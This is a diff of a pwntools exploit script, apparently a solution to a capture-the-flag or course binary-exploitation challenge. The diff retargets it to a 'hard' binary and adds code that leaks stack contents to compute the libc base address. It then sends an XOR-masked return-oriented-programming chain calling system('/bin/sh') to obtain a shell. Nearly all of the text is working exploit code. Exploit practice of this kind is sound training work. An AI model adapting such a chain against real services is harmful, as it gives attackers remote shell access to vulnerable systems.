@@ -2,10 +2,10 @@
 from pwn import *
 
 # exe = ELF("./easy")
-exe = ELF("./medium")
+# exe = ELF("./medium")
 # hard chall is dynamically linked, so here's helper
 # patched version to load proper ld and libc
-# exe = ELF("./hard_patched")
+exe = ELF("./hard_patched")
 libc = ELF("./libc.so.6")
 ld = ELF("./ld-linux-x86-64.so.2")
 
@@ -31,31 +31,44 @@ def send_init(r):
 
 
 def conn():
-    # r = process([exe.path, index_number])
-    r = remote("bsk.bonus.re", 13337)
+    r = process([exe.path, index_number])
+    # r = remote("bsk.bonus.re", 13337)
     if args.GDB:
         gdb.attach(r)
-    send_config(r)
+    # send_config(r)
 
-    dl = 96
+    dl = 14 * 8
     send_init(r)
-    r.sendline(str(dl + 1).encode())
-    r.sendline(b"\0" * dl + b"\n")
-    for _ in range(5 + 9):
+    r.sendline(str(dl).encode())
+    r.sendline(b"\0" * dl)
+    for _ in range(5):
         __ = r.recvline()
-        # print(__.decode())
-    recv = r.recvn(dl + 1)  # bytes for xor
+    recv = r.recvn(dl)
 
     for _ in range(0, dl, 8):
         print(hex(u64(recv[_:_ + 8])))
 
-    pop_rdi = 0x402326
-    binsh = 0x4a014d
-    system = 0x40189b
+    libc_off = u64(recv[(13 * 8):]) - 0x280D0
+    pop_rdi_off = 0x28715
+    ret_off = 0x28716
+    binsh_off = 0x1c041b
+    system_off = 0x55230
+
+    print("libc=" + hex(libc_off))
+    print("pop_rdi=" + hex(libc_off + pop_rdi_off))
+    print("ret=" + hex(libc_off + ret_off))
+    print("binsh=" + hex(libc_off + binsh_off))
+    print("system=" + hex(libc_off + system_off))
 
     send_init(r)
-    r.sendline(b"96")
-    payload = 72 * b"\0" + bxor(p64(pop_rdi) + p64(binsh) + p64(system), recv[72:96])
+    dl = 104
+    r.sendline(str(dl).encode())
+    payload = 72 * b"\0" + bxor(
+        p64(libc_off + ret_off) +
+        p64(libc_off + pop_rdi_off) +
+        p64(libc_off + binsh_off) +
+        p64(libc_off + system_off),
+        recv[72: dl])
     r.sendline(payload)
 
     # for _ in range(5):
